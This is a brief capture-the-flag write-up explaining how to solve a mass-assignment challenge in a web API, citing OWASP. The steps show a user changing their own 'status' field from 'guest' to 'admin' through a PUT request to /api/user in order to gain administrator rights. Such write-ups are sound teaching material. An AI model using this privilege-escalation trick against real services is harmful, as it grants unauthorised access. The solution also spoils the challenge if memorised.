# Challenge17: API - Mass Assignment

## Ref:
+ OWASP API Security TOP 10: https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/

## Solution
    
1. Create a new account using /api/signup 
2. Log in to that account using /api/login
3. Get your user information by request GET to /api/user, and this is the result:

```json
{
    "id": ...,
    "username": ...,
    "note": ...,
    "status": "guest"
}
```


4. Now based on best practice on API naming convention. We can try send a PUT request to /api/user with:

```json
{
    "id": ...,
    "username": ...,
    "note": ...,
    "status": "admin"
}

```

5. Now your status is admin :). You can get your flag.
